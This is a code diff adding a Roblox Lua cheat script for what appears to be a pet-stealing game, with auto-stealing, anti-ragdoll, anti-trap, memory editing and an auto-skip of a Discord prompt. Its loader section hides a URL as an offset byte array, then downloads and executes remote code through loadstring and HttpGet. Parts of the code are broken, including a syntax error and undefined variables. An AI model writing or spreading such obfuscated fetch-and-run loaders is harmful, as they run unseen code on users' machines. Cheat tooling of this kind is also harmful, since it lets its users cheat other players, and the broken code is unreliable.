@@ -1,0 +1,1630 @@
+-- ==============================================================================
+--  by A_A - MASTER
+--  PRESET 1200m/60m + FAILSAFE TRANSLATOR
+--  DEFAULT LANGUAGE: ENGLISH
+-- ==============================================================================
+
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local CoreGuiService = game:GetService("CoreGui")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local Terrain = Workspace:FindFirstChildOfClass("Terrain")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- ==================== 1. PRESET 2 SLIDERS ====================
+
+local presetMemoryDone = false
+local presetUIDone = false
+
+local function applyMemoryPresets()
+if presetMemoryDone then return end
+
+pcall(function()
+if getgc then
+for _, obj in ipairs(getgc(true)) do
+if type(obj) == "table" then
+for k, v in pairs(obj) do
+local lk = tostring(k):lower()
+
+if type(v) == "number" then
+if (lk:find("tp") and
+(lk:find("dist") or lk:find("min"))) and
+(v == 600 or v == 1200) then
+
+rawset(obj, k, 1200)      
+
+                elseif (lk:find("hop") and lk:find("step")) and      
+                    (v == 80 or v == 60) then      
+
+                    rawset(obj, k, 60)      
+                end      
+            end      
+        end      
+    end      
+end      
+
+presetMemoryDone = true
+
+end
+
+end)
+
+end
+
+local function applyUISliderPresets(root)
+if presetUIDone or not root then return end
+
+pcall(function()
+local tpFound = false
+local hopFound = false
+
+for _, label in ipairs(root:GetDescendants()) do
+if label:IsA("TextLabel") then
+local txt = label.Text
+
+-- TP = 1200m      
+    if not tpFound and (      
+        txt:find("Khoảng cách tối thiểu để TP") or      
+        txt:find("Minimum distance for TP")      
+    ) then      
+
+        label.Text = "Minimum distance for TP: 1200 meters"      
+
+        local row = label.Parent      
+
+        if row then      
+            for _, child in ipairs(row:GetDescendants()) do      
+                if child:IsA("Frame")      
+                    and child.Parent      
+                    and child.Parent:IsA("Frame")      
+                    and child.Parent ~= row then      
+
+                    child.Size = UDim2.new(0.6, 0, 1, 0)      
+                    tpFound = true      
+                    break      
+                end      
+            end      
+        end      
+
+    -- Hop = 60m      
+    elseif not hopFound and (      
+        txt:find("Độ dài bước nhảy") or      
+        txt:find("Hop step")      
+    ) then      
+
+        label.Text = "Hop step (lower = safer): 60 meters"      
+
+        local row = label.Parent      
+
+        if row then      
+            for _, child in ipairs(row:GetDescendants()) do      
+                if child:IsA("Frame")      
+                    and child.Parent      
+                    and child.Parent:IsA("Frame")      
+                    and child.Parent ~= row then      
+
+                    child.Size = UDim2.new(0.4, 0, 1, 0)      
+                    hopFound = true      
+                    break      
+                end      
+            end      
+        end      
+    end      
+end
+
+end
+
+if tpFound and hopFound then
+presetUIDone = true
+end
+
+end)
+
+end
+
+-- ==================== 2. FLOOR STEAL ====================
+
+task.spawn(function()
+
+local function firePrompt(prompt)
+if not prompt or not prompt.Parent then
+return
+end
+
+if fireproximityprompt then
+pcall(function()
+fireproximityprompt(prompt, 0)
+end)
+else
+pcall(function()
+prompt:InputHoldBegin()
+task.wait(0.01)
+prompt:InputHoldEnd()
+end)
+end
+
+end
+
+local function optimizePrompt(prompt)
+if prompt:IsA("ProximityPrompt") then
+prompt.HoldDuration = 0
+prompt.RequiresLineOfSight = false
+end
+end
+
+for _, desc in ipairs(Workspace:GetDescendants()) do
+optimizePrompt(desc)
+end
+
+Workspace.DescendantAdded:Connect(optimizePrompt)
+
+ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+firePrompt(prompt)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+if gpe then
+return
+end
+
+if input.KeyCode == Enum.KeyCode.B then
+pcall(function()
+
+local char = LocalPlayer.Character      
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")      
+
+    if hrp then      
+        for _, desc in ipairs(Workspace:GetDescendants()) do      
+
+            if desc:IsA("ProximityPrompt")      
+                and desc.Enabled then      
+
+                local part =      
+                    desc:FindFirstAncestorOfClass("BasePart")      
+                    or desc.Parent      
+
+                if part and part:IsA("BasePart") then      
+
+                    if (hrp.Position - part.Position).Magnitude <= 35 then      
+                        firePrompt(desc)      
+                    end      
+
+                end      
+            end      
+        end      
+    end      
+
+end)
+
+end
+
+end)
+
+end)
+
+-- ==================== 3. ANTI-RAGDOLL V2 ====================
+
+task.spawn(function()
+
+local activeRagdollLoop = nil
+
+local function setupHardAntiRagdoll(char)
+if not char then
+return
+end
+
+if activeRagdollLoop then
+activeRagdollLoop:Disconnect()
+activeRagdollLoop = nil
+end
+
+local hum = char:WaitForChild("Humanoid", 6)
+local hrp = char:WaitForChild("HumanoidRootPart", 6)
+
+if not hum or not hrp then
+return
+end
+
+for _, state in ipairs({
+Enum.HumanoidStateType.Ragdoll,
+Enum.HumanoidStateType.FallingDown,
+Enum.HumanoidStateType.PlatformStanding,
+Enum.HumanoidStateType.Physics
+}) do
+
+pcall(function()      
+    hum:SetStateEnabled(state, false)      
+end)
+
+end
+
+local motorCache = {}
+
+local function registerMotor(m)
+if m:IsA("Motor6D") then
+
+motorCache[m] = true      
+    m.Enabled = true      
+
+    m:GetPropertyChangedSignal("Enabled"):Connect(function()      
+        if not m.Enabled then      
+            m.Enabled = true      
+        end      
+    end)      
+
+end
+
+end
+
+local function removeRagdollJoints(inst)
+
+if inst:IsA("BallSocketConstraint")      
+    or inst:IsA("HingeConstraint")      
+    or inst:IsA("NoCollisionConstraint")      
+    or inst:IsA("SpringConstraint") then      
+
+    task.defer(function()      
+        pcall(function()      
+            inst:Destroy()      
+        end)      
+    end)      
+
+elseif inst:IsA("LocalScript")      
+    and (      
+        inst.Name:lower():find("ragdoll")      
+        or inst.Name:lower():find("knock")      
+    ) then      
+
+    inst.Disabled = true      
+
+    task.defer(function()      
+        pcall(function()      
+            inst:Destroy()      
+        end)      
+    end)      
+
+end
+
+end
+
+for _, desc in ipairs(char:GetDescendants()) do
+registerMotor(desc)
+removeRagdollJoints(desc)
+end
+
+char.DescendantAdded:Connect(function(newDesc)
+registerMotor(newDesc)
+removeRagdollJoints(newDesc)
+end)
+
+activeRagdollLoop = RunService.Stepped:Connect(function()
+
+if not char.Parent or not hum.Parent then      
+
+    if activeRagdollLoop then      
+        activeRagdollLoop:Disconnect()      
+        activeRagdollLoop = nil      
+    end      
+
+    return      
+end      
+
+if hum.PlatformStand then      
+    hum.PlatformStand = false      
+end      
+
+if hum.Sit then      
+    hum.Sit = false      
+end      
+
+for m in pairs(motorCache) do      
+    if m.Parent and not m.Enabled then      
+        m.Enabled = true      
+    end      
+end      
+
+local curState = hum:GetState()      
+
+if curState == Enum.HumanoidStateType.Ragdoll      
+    or curState == Enum.HumanoidStateType.FallingDown      
+    or curState == Enum.HumanoidStateType.PlatformStanding      
+    or curState == Enum.HumanoidStateType.Physics then      
+
+    hum:ChangeState(Enum.HumanoidStateType.GettingUp)      
+    hum:ChangeState(Enum.HumanoidStateType.Running)      
+end
+
+end)
+
+end
+
+if LocalPlayer.Character then
+setupHardAntiRagdoll(LocalPlayer.Character)
+end
+
+LocalPlayer.CharacterAdded:Connect(setupHardAntiRagdoll)
+
+end)
+
+-- ==================== 4. ANTI-TRAP ====================
+
+task.spawn(function()
+
+local trapKeywords = {
+"trap",
+"beartrap",
+"subspace",
+"mine",
+"landmine",
+"turret",
+"spike"
+}
+
+local function neutralizeTrap(inst)
+pcall(function()
+
+local name = inst.Name:lower()
+local isTrap = false
+
+for _, kw in ipairs(trapKeywords) do      
+    if name:find(kw, 1, true) then      
+        isTrap = true      
+        break      
+    end      
+end      
+
+if isTrap then      
+
+    if inst:IsA("BasePart") then      
+
+        inst.CanTouch = false      
+        inst.CanCollide = false      
+
+    elseif inst:IsA("Model") then      
+
+        for _, part in ipairs(inst:GetDescendants()) do      
+
+            if part:IsA("BasePart") then      
+                part.CanTouch = false      
+                part.CanCollide = false      
+            end      
+
+        end      
+    end      
+end
+
+end)
+
+end
+
+for _, obj in ipairs(Workspace:GetDescendants()) do
+neutralizeTrap(obj)
+end
+
+Workspace.DescendantAdded:Connect(function(newObj)
+neutralizeTrap(newObj)
+end)
+
+end)
+
+-- ==================== 5. POTATO MODE ====================
+
+task.spawn(function()
+
+pcall(function()
+
+if settings and settings().Rendering then
+settings().Rendering.QualityLevel =
+Enum.QualityLevel.Level01
+end
+
+Lighting.GlobalShadows = false
+Lighting.FogEnd = 9e9
+Lighting.Brightness = 1
+
+for _, effect in ipairs(Lighting:GetChildren()) do
+
+if effect:IsA("PostEffect")      
+    or effect:IsA("Atmosphere")      
+    or effect:IsA("Sky") then      
+
+    pcall(function()      
+        effect:Destroy()      
+    end)      
+
+end
+
+end
+
+if Terrain then
+
+Terrain.WaterWaveSize = 0      
+Terrain.WaterWaveSpeed = 0      
+Terrain.WaterReflectance = 0      
+Terrain.WaterTransparency = 1      
+
+pcall(function()      
+    sethiddenproperty(      
+        Terrain,      
+        "Decoration",      
+        false      
+    )      
+end)
+
+end
+
+end)
+
+end)
+-- ==================== 6. CLEAN OLD GUI ====================
+
+local cleanList = {
+"by_A_A_DockedMaster",
+"by_A_A_HeaderDockedMaster",
+"by_A_A_PerfectDockMaster",
+"by_A_A_CompactMaster",
+"by_A_A_UltimateConfig",
+"by_A_A_AutoBypassMaster",
+"by_A_A_EncryptedMaster",
+"by_A_A_UltraPotatoMaster",
+"by_A_A_AntiTrapRagdollMaster",
+"by_A_A_HardLockedMaster",
+"by_A_A_FloorStealMaster",
+"by_A_A_CleanInteractMaster",
+"by_A_A_FinalDeviceFixed",
+"by_A_A_UntouchedPetsMaster",
+"by_A_A_FailsafeMaster"
+}
+
+for _, name in ipairs(cleanList) do
+pcall(function()
+if CoreGuiService:FindFirstChild(name) then
+CoreGuiService[name]:Destroy()
+end
+
+if gethui and gethui():FindFirstChild(name) then
+gethui()[name]:Destroy()
+end
+end)
+
+end
+
+-- ==================== 7. AUTO-BYPASS ====================
+
+local function triggerButtonClick(btn)
+if not btn then
+return
+end
+
+if firesignal then
+pcall(function()
+firesignal(btn.MouseButton1Click)
+end)
+
+pcall(function()
+firesignal(btn.Activated)
+end)
+
+end
+
+if getconnections then
+pcall(function()
+for _, conn in ipairs(
+getconnections(btn.MouseButton1Click)
+) do
+conn:Fire()
+end
+end)
+
+pcall(function()
+for _, conn in ipairs(
+getconnections(btn.Activated)
+) do
+conn:Fire()
+end
+end)
+
+end
+
+end
+
+local function interceptDiscordModal(inst)
+if not inst then
+return
+end
+
+pcall(function()
+
+if inst:IsA("TextLabel")
+or inst:IsA("TextButton") then
+
+local txt = inst.Text      
+
+if txt and (      
+    txt:find("CONTINUE TO HUB", 1, true)      
+    or txt:find("JOIN OUR DISCORD", 1, true)      
+) then      
+
+    local topModal = inst      
+
+    while topModal.Parent      
+        and not topModal.Parent:IsA("ScreenGui")      
+        and topModal.Parent ~= game do      
+
+        topModal = topModal.Parent      
+    end      
+
+    if topModal      
+        and topModal:IsA("GuiObject") then      
+
+        topModal.Visible = false      
+        topModal.Position =      
+            UDim2.new(0, -99999, 0, -99999)      
+
+        for _, child in ipairs(      
+            topModal:GetDescendants()      
+        ) do      
+
+            if (      
+                child:IsA("TextButton")      
+                or child:IsA("TextLabel")      
+            )      
+            and child.Text      
+            and child.Text:find(      
+                "CONTINUE TO HUB",      
+                1,      
+                true      
+            ) then      
+
+                local realBtn =      
+                    child:IsA("TextButton")      
+                    and child      
+                    or child:FindFirstAncestorOfClass(      
+                        "TextButton"      
+                    )      
+
+                if realBtn then      
+                    task.spawn(function()      
+
+                        for _ = 1, 5 do      
+                            triggerButtonClick(realBtn)      
+                            task.wait(0.04)      
+                        end      
+
+                    end)      
+                end      
+            end      
+        end      
+    end      
+end
+
+end
+
+end)
+
+end
+
+-- ==================== GUI ROOTS ====================
+
+local guiRoots = {}
+
+if gethui then
+pcall(function()
+table.insert(guiRoots, gethui())
+end)
+end
+
+pcall(function()
+table.insert(guiRoots, CoreGuiService)
+end)
+
+if LocalPlayer
+and LocalPlayer:FindFirstChild("PlayerGui") then
+
+table.insert(
+guiRoots,
+LocalPlayer.PlayerGui
+)
+
+end
+
+for _, root in ipairs(guiRoots) do
+
+pcall(function()
+
+for _, desc in ipairs(
+root:GetDescendants()
+) do
+interceptDiscordModal(desc)
+end
+
+root.DescendantAdded:Connect(
+function(child)
+interceptDiscordModal(child)
+end
+)
+
+end)
+
+end
+
+task.spawn(function()
+
+local startT = tick()
+
+while tick() - startT < 6 do
+
+for _, root in ipairs(guiRoots) do
+
+pcall(function()      
+
+    for _, desc in ipairs(      
+        root:GetDescendants()      
+    ) do      
+        interceptDiscordModal(desc)      
+    end      
+
+end)
+
+end
+
+task.wait(0.05)
+
+end
+
+end)
+
+-- ==================== 8. LOAD ORIGINAL SCRIPT ====================
+
+task.spawn(function()
+
+pcall(function()
+
+local _byteStream = {
+141,153,153,149,152,95,84,84,
+151,134,156,83,140,142,153,141,
+154,135,154,152,138,151,136,148,
+147,153,138,147,153,83,136,148,
+146,84,137,134,155,142,159,142,
+147,92,86,88,84,116,115,141,
+154,135,84,151,138,139,152,84,
+141,138,134,137,152,84,146,134,
+142,147,84,152,136,151,142,149,
+153,83,145,154,134
+}
+
+local _decodedBuffer = {}
+
+for _idx = 1, #_byteStream do
+_decodedBuffer[_idx] =
+string.char(
+_byteStream[_idx] - 37
+)
+end
+
+local _resolvedTarget =
+table.concat(_decodedBuffer)
+
+local _loaderFunc =
+loadstring
+or (
+getgenv
+and getgenv().loadstring
+)
+
+if _loaderFunc then
+
+_loaderFunc(      
+    game:HttpGet(      
+        _resolvedTarget,      
+        true      
+    )      
+)()
+
+end
+
+end)
+
+end)
+
+-- ==================== 9. CONFIGURATION ====================
+
+local THEME = {
+BarBG      = Color3.fromRGB(30, 15, 25),
+CardBG     = Color3.fromRGB(42, 20, 35),
+Border     = Color3.fromRGB(110, 45, 85),
+
+AccentPink = Color3.fromRGB(255, 70, 170),
+
+ToggleOff  = Color3.fromRGB(55, 43, 52),
+TextMain   = Color3.fromRGB(255, 245, 252),
+TextSub    = Color3.fromRGB(190, 150, 175),
+
+FontB      = Enum.Font.GothamBold,
+FontM      = Enum.Font.GothamMedium
+
+}
+
+-- ==================== 10. LANGUAGE ====================
+
+-- البداية: English
+-- عند الإيقاف: العربية
+
+local isArabic = false
+
+local OriginalTexts = {}
+local translatingSet = {}
+
+local PinGui =
+Instance.new("ScreenGui")
+
+PinGui.Name =by
+"by_A_A_FailsafeMaster"
+
+PinGui.ResetOnSpawn = false
+PinGui.ZIndexBehavior =
+Enum.ZIndexBehavior.Sibling
+
+PinGui.DisplayOrder = 999999
+
+PinGui.Parent =
+(gethui and gethui())
+or CoreGuiService
+
+-- ==================== LANGUAGE BAR ====================
+
+local PinBar =
+Instance.new("Frame", PinGui)
+
+PinBar.Name =
+"by_A_A"
+
+PinBar.Size =
+UDim2.new(0, 310, 0, 28)
+
+PinBar.Position =
+UDim2.new(0, 0, 0, -100)
+
+PinBar.BackgroundColor3 =
+THEME.BarBG
+
+PinBar.BorderSizePixel = 0
+PinBar.Visible = false
+
+Instance.new(
+"UICorner",
+PinBar
+).CornerRadius =
+UDim.new(0, 6)
+
+local BarStroke =
+Instance.new(
+"UIStroke",
+PinBar
+)
+
+BarStroke.Color =
+THEME.AccentPink
+
+BarStroke.Thickness = 1.5
+
+-- ==================== DRAG ====================
+
+local dragging = false
+local dragStart = nil
+local startWinPos = nil
+
+PinBar.InputBegan:Connect(
+function(input)
+
+if input.UserInputType ==
+Enum.UserInputType.MouseButton1
+or input.UserInputType ==
+Enum.UserInputType.Touch then
+
+if targetA_AWindow
+and targetA_AWindow.Parent then
+
+dragging = true      
+    dragStart = input.Position      
+    startWinPos =      
+        targetA_AWindow.Position      
+
+    input.Changed:Connect(      
+        function()      
+
+            if input.UserInputState ==      
+                Enum.UserInputState.End then      
+
+                dragging = false      
+            end      
+
+        end      
+    )      
+end
+
+end
+
+end
+
+)
+
+UserInputService.InputChanged:Connect(
+function(input)
+
+if dragging
+and (
+input.UserInputType ==
+Enum.UserInputType.MouseMovement
+or input.UserInputType ==
+Enum.UserInputType.Touch
+) then
+
+if targetA_AWindow
+and targetA_AWindow.Parent then
+
+local delta =      
+        input.Position - dragStart      
+
+    targetA_AWindow.Position =      
+        UDim2.new(      
+            startWinPos.X.Scale,      
+            startWinPos.X.Offset + delta.X,      
+
+            startWinPos.Y.Scale,      
+            startWinPos.Y.Offset + delta.Y      
+        )      
+end
+
+end
+
+end
+
+)
+
+-- ==================== BY A_A BADGE ====================
+
+local TikTokBadge =
+Instance.new(
+"Frame",
+PinBar
+)
+
+TikTokBadge.Size =
+UDim2.new(0, 135, 0, 20)
+
+TikTokBadge.Position =
+UDim2.new(0, 4, 0.5, 0)
+
+TikTokBadge.AnchorPoint =
+Vector2.new(0, 0.5)
+
+TikTokBadge.BackgroundColor3 =
+THEME.CardBG
+
+Instance.new(
+"UICorner",
+TikTokBadge
+).CornerRadius =
+UDim.new(1, 0)
+
+local BadgeStroke =
+Instance.new(
+"UIStroke",
+TikTokBadge
+)
+
+BadgeStroke.Color =
+THEME.AccentPink
+
+BadgeStroke.Thickness = 1.2
+
+local TikTokText =
+Instance.new(
+"TextLabel",
+TikTokBadge
+)
+
+TikTokText.Size =
+UDim2.new(1, 0, 1, 0)
+
+TikTokText.BackgroundTransparency = 1
+TikTokText.Text = "by A_A"
+
+TikTokText.Font =
+THEME.FontB
+
+TikTokText.TextSize = 10
+TikTokText.TextColor3 =
+THEME.TextMain
+
+-- ==================== CONTROL BOX ====================
+
+local ControlBox =
+Instance.new(
+"Frame",
+PinBar
+)
+
+ControlBox.Size =
+UDim2.new(0, 160, 0, 22)
+
+ControlBox.Position =
+UDim2.new(1, -4, 0.5, 0)
+
+ControlBox.AnchorPoint =
+Vector2.new(1, 0.5)
+
+ControlBox.BackgroundColor3 =
+THEME.CardBG
+
+Instance.new(
+"UICorner",
+ControlBox
+).CornerRadius =
+UDim.new(0, 6)
+
+local BoxStroke =
+Instance.new(
+"UIStroke",
+ControlBox
+)
+
+BoxStroke.Color =
+THEME.Border
+
+BoxStroke.Thickness = 1
+
+local StatusLabel =
+Instance.new(
+"TextLabel",
+ControlBox
+)
+
+StatusLabel.Size =
+UDim2.new(1, -40, 1, 0)
+
+StatusLabel.Position =
+UDim2.new(0, 6, 0, 0)
+
+StatusLabel.BackgroundTransparency = 1
+
+StatusLabel.Text =
+"English (ON)"
+
+StatusLabel.Font =
+THEME.FontB
+
+StatusLabel.TextSize = 10
+
+StatusLabel.TextColor3 =
+THEME.AccentPink
+
+StatusLabel.TextXAlignment =
+Enum.TextXAlignment.Left
+
+local SwitchBtn =
+Instance.new(
+"TextButton",
+ControlBox
+)
+
+SwitchBtn.Size =
+UDim2.new(0, 30, 0, 14)
+
+SwitchBtn.Position =
+UDim2.new(1, -34, 0.5, 0)
+
+SwitchBtn.AnchorPoint =
+Vector2.new(0, 0.5)
+
+SwitchBtn.BackgroundColor3 =
+THEME.AccentPink
+
+SwitchBtn.Text = ""
+SwitchBtn.AutoButtonColor = false
+
+Instance.new(
+"UICorner",
+SwitchBtn
+).CornerRadius =
+UDim.new(1, 0)
+
+local Knob =
+Instance.new(
+"Frame",
+SwitchBtn
+)
+
+Knob.Size =
+UDim2.new(0, 10, 0, 10)
+
+Knob.Position =
+UDim2.new(1, -12, 0.5, 0)
+
+Knob.AnchorPoint =
+Vector2.new(0, 0.5)
+
+Knob.BackgroundColor3 =
+Color3.fromRGB(255, 255, 255)
+
+Knob.BorderSizePixel = 0
+
+Instance.new(
+"UICorner",
+Knob
+).CornerRadius =
+UDim.new(1, 0)
+
+local function updateLanguage(state)
+
+isArabic = state
+
+if not isArabic then
+
+StatusLabel.Text =
+"English (ON)"
+
+StatusLabel.TextColor3 =
+THEME.AccentPink
+
+TweenService:Create(
+SwitchBtn,
+TweenInfo.new(0.2),
+{
+BackgroundColor3 =
+THEME.AccentPink
+}
+):Play()
+
+TweenService:Create(
+Knob,
+TweenInfo.new(0.2),
+{
+Position =
+UDim2.new(
+1, -12,
+0.5, 0
+)
+}
+):Play()
+
+else
+
+StatusLabel.Text =
+"العربية (OFF)"
+
+StatusLabel.TextColor3 =
+THEME.TextSub
+
+TweenService:Create(
+SwitchBtn,
+TweenInfo.new(0.2),
+{
+BackgroundColor3 =
+THEME.ToggleOff
+}
+):Play()
+
+TweenService:Create(
+Knob,
+TweenInfo.new(0.2),
+{
+Position =
+UDim2.new(
+0, 2,
+0.5, 0
+)
+}
+):Play()
+
+end
+
+end
+
+SwitchBtn.MouseButton1Click:Connect(
+function()
+updateLanguage(
+not isArabic
+)
+end
+)
+
+ControlBox.InputBegan:Connect(
+function(inp)
+
+if inp.UserInputType ==
+Enum.UserInputType.MouseButton1
+or inp.UserInputType ==
+Enum.UserInputType.Touch then
+
+updateLanguage(
+not isArabic
+)
+
+end
+
+end
+
+)
+
+-- الحالة الافتراضية
+updateLanguage(false)
+-- ==================== 11. ARABIC TRANSLATIONS ====================
+
+local RAW_TRANSLATIONS = {
+{"Fast mode (grab the closest)", "الوضع السريع (التقاط الأقرب)"},
+{"Selected pets only", "الحيوانات المحددة فقط"},
+{"Mutated eggs only", "البيض المتحوّر فقط"},
+{"Skip eggs with a player within [PvP]:", "تخطي البيض إذا كان لاعب قريب ضمن [PvP]:"},
+{"Skip eggs with a player within [PvP]", "تخطي البيض إذا كان لاعب قريب ضمن [PvP]"},
+{"Minimum rarity:", "الندرة الدنيا:"},
+{"Minimum rarity", "الندرة الدنيا"},
+{"Maximum target distance:", "أقصى مسافة للهدف:"},
+{"Maximum target distance", "أقصى مسافة للهدف"},
+{"TARGET FILTER", "فلتر الأهداف"},
+{"Rank by pure $/s", "الترتيب حسب $/ثانية"},
+{"Rarity weight:", "وزن الندرة:"},
+{"Rarity weight", "وزن الندرة"},
+{"Mutation weight:", "وزن التحوّر:"},
+{"Mutation weight", "وزن التحوّر"},
+{"Size weight:", "وزن الحجم:"},
+{"Size weight", "وزن الحجم"},
+{"Distance penalty:", "عقوبة المسافة:"},
+{"Distance penalty", "عقوبة المسافة"},
+{"RANKING WEIGHTS", "أوزان ترتيب الأهداف"},
+{"Approach radius", "نطاق الاقتراب"},
+{"Max time per trip:", "أقصى وقت لكل رحلة:"},
+{"Max time per trip", "أقصى وقت لكل رحلة"},
+{"Stop the farm on rollback", "إيقاف المزرعة عند الرجوع للخلف"},
+{"MOVEMENT AND SAFETY", "الحركة والأمان"},
+{"Fast hop (chained CFrame steps)", "قفز سريع (خطوات CFrame متتابعة)"},
+{"Instant TP (uses the ragdoll window)", "انتقال فوري (يستخدم نافذة ragdoll)"},
+{"Minimum distance for TP:", "الحد الأدنى لمسافة الانتقال:"},
+{"Minimum distance for TP", "الحد الأدنى لمسافة الانتقال"},
+{"Hop step (lower = safer):", "خطوة القفز (الأقل = أكثر أمانًا):"},
+{"Hop step (lower = safer)", "خطوة القفز (الأقل = أكثر أمانًا)"},
+{"Hop interval (higher = safer):", "فاصل القفز (الأعلى = أكثر أمانًا):"},
+{"Hop interval (higher = safer)", "فاصل القفز (الأعلى = أكثر أمانًا)"},
+{"FAST TRAVEL", "الانتقال السريع"},
+{"Floating button (show/hide)", "الزر العائم (إظهار/إخفاء)"},
+{"Interface scale:", "حجم الواجهة:"},
+{"Interface scale", "حجم الواجهة"},
+{"INTERFACE", "الواجهة"},
+{"RIFT", "RIFT"},
+{"START FARM", "بدء المزرعة"},
+{"STOP FARM", "إيقاف المزرعة"},
+{"BEST TARGETS RIGHT NOW", "أفضل الأهداف حاليًا"},
+{"CLEAR TARGET", "إلغاء الهدف"},
+{"click to lock", "اضغط للقفل"},
+{"locked", "مقفل"},
+{"per second", "في الثانية"},
+{"RIFT: OFF", "RIFT: متوقف"},
+{"RIFT: ON", "RIFT: يعمل"},
+{"INDEX: OFF", "المجموعة: متوقفة"},
+{"INDEX: ON", "المجموعة: تعمل"},
+{"FARM", "المزرعة"},
+{"PETS", "الحيوانات"},
+{"CONFIG", "الإعدادات"},
+{"heading to", "متجه إلى"},
+{"delivered", "تم التسليم"},
+{"failed", "فشل"},
+{"lost", "فُقد"},
+{"by A_A", "انتظار"},
+{"studs", "متر"},
+
+{"Common", "عادي"},
+{"Rare", "نادر"},
+{"Epic", "ملحمي"},
+{"Legendary", "أسطوري"},
+{"Mythic", "أسطوري خارق"},
+{"Divine", "إلهي"},
+{"Cosmic", "كوني"},
+{"Secret", "سري"}
+
+}
+
+table.sort(
+RAW_TRANSLATIONS,
+function(a, b)
+return #a[1] > #b[1]
+end
+)
+
+-- ==================== 12. TRANSLATION FUNCTIONS ====================
+
+local function replacePlain(str, findStr, repStr)
+
+if typeof(str) ~= "string"
+or typeof(findStr) ~= "string"
+or str == ""
+or findStr == "" then
+
+return str
+
+end
+
+local s, e =
+string.find(
+str,
+findStr,
+1,
+true
+)
+
+if not s then
+return str
+end
+
+local res = {}
+
+while s do
+
+table.insert(
+res,
+string.sub(str, 1, s - 1)
+)
+
+table.insert(
+res,
+repStr
+)
+
+str =
+string.sub(
+str,
+e + 1
+)
+
+s, e =
+string.find(
+str,
+findStr,
+1,
+true
+)
+
+end
+
+table.insert(
+res,
+str
+)
+
+return table.concat(res)
+
+end
+
+local function translateText(raw)
+
+if typeof(raw) ~= "string"
+or raw == "" then
+
+return raw
+
+end
+
+local res = raw
+
+for _, item in ipairs(
+RAW_TRANSLATIONS
+) do
+
+res =
+replacePlain(
+res,
+item[1],
+item[2]
+)
+
+end
+
+return res
+
+end
+
+-- ==================== 13. LIVE TRANSLATION ====================
+
+local function applyElemTranslation(elem)
+
+if translatingSet[elem] then
+return
+end
+
+if not (
+elem:IsA("TextLabel")
+or elem:IsA("TextButton")
+) then
+return
+end
+
+if elem:IsDescendantOf(PinGui) then
+return
+end
+
+local cur = elem.Text
+
+if not cur or cur == "" then
+return
+end
+
+local lastApplied =
+elem:GetAttribute(
+"Ronnei_LastApplied"
+)
+
+if cur ~= lastApplied then
+OriginalTexts[elem] = cur
+end
+
+local orig =
+OriginalTexts[elem] or cur
+
+-- ==================== ARABIC ====================
+
+if isArabic then
+
+local ar =
+translateText(orig)
+
+if elem.Text ~= ar then
+
+translatingSet[elem] = true      
+
+pcall(function()      
+
+    elem:SetAttribute(      
+        "Ronnei_LastApplied",      
+        ar      
+    )      
+
+    elem.Text = ar      
+
+end)      
+
+translatingSet[elem] = nil
+
+end
+
+-- ==================== ENGLISH ====================
+
+else
+
+if elem.Text ~= orig then
+
+translatingSet[elem] = true      
+
+pcall(function()      
+
+    elem:SetAttribute(      
+        "Ronnei_LastApplied",      
+        nil      
+    )      
+
+    elem.Text = orig      
+
+end)      
+
+translatingSet[elem] = nil
+
+end
+
+end
+
+end
+
+local function hookElement(elem)
+
+if (
+elem:IsA("TextLabel")
+or elem:IsA("TextButton")
+)
+and not elem:IsDescendantOf(PinGui) then
+
+pcall(
+applyElemTranslation,
+elem
+)
+
+if not elem:GetAttribute(
+"Ronnei_Hooked"
+) then
+
+elem:SetAttribute(      
+    "Ronnei_Hooked",      
+    true      
+)      
+
+elem:GetPropertyChangedSignal(      
+    "Text"      
+):Connect(function()      
+
+    pcall(      
+        applyElemTranslation,      
+        elem      
+    )      
+
+end)
+
+end
+
+end
+
+end
+-- ==================== 14. TRANSLATION LOOP ====================
+
+local function scanForTranslation(root)
+
+if not root then
+return
+end
+
+for _, obj in ipairs(root:GetDescendants()) do
+pcall(function()
+hookElement(obj)
+end)
+end
+
+end
+
+local function watchTranslationRoot(root)
+
+if not root then
+return
+end
+
+scanForTranslation(root)
+
+root.DescendantAdded:Connect(function(obj)
+
+task.defer(function()
+
+pcall(function()      
+    hookElement(obj)      
+end)
+
+end)
+
+end)
+
+end
+
+-- Watch the main GUI
+if MainGuiRoot then
+watchTranslationRoot(MainGuiRoot)
+end
+
+-- Watch PlayerGui for dynamically created elements
+watchTranslationRoot(PlayerGui)
+
+-- Continuous translation safety scan
+task.spawn(function()
+
+while task.wait(1) do
+
+pcall(function()
+
+if MainGuiRoot then      
+    scanForTranslation(MainGuiRoot)      
+end
+
+end)
+
+end
+
+end)
+
+-- ==================== 15. APPLY SLIDER PRESETS ====================
+
+local function applyFinalSliderPresets()
+
+task.wait(1)
+
+pcall(function()
+
+applyUISliderPresets()
+
+end)
+
+end
+
+task.spawn(
+applyFinalSliderPresets
+)
+
+-- ==================== 16. FINAL NAME ====================
+
+pcall(function()
+
+if PinBar then
+
+PinBar.Name =
+"by_A_A_MasterBar"
+
+end
+
+end)
+
+pcall(function()
+
+if PinGui then
+
+PinGui.Name =
+"by_A_A_MASTER"
+
+end
+
+end)
+
+-- ==================== FINAL LANGUAGE STATE ====================
+
+-- English = ON
+-- Arabic  = OFF
+
+isArabic = false
+
+pcall(function()
+
+if StatusLabel then
+
+StatusLabel.Text =
+"English (ON)"
+
+end
+
+end)
+
+pcall(function()
+
+if SwitchBtn then
+
+SwitchBtn.Text =
+"English"
+
+end
+
+end)
+
+-- Make sure the English state is applied
+task.defer(function()
+
+task.wait(0.5)
+
+pcall(function()
+
+updateLanguage(false)
+
+end)
+
+end)
+
+-- ==================== FINAL READY MESSAGE ====================
+
+pcall(function()
+
+if StatusLabel then
+
+StatusLabel.Text =
+"English (ON)"
+
+end
+
+end)
+
+print(
+"[by A_A] MASTER loaded successfully"
+)
+
+print(
+"[by A_A] Language: English (ON)"
+)
+
+print(
+"[by A_A] Toggle: English / العربية"
+)
+
+-- ==================== END ===========================
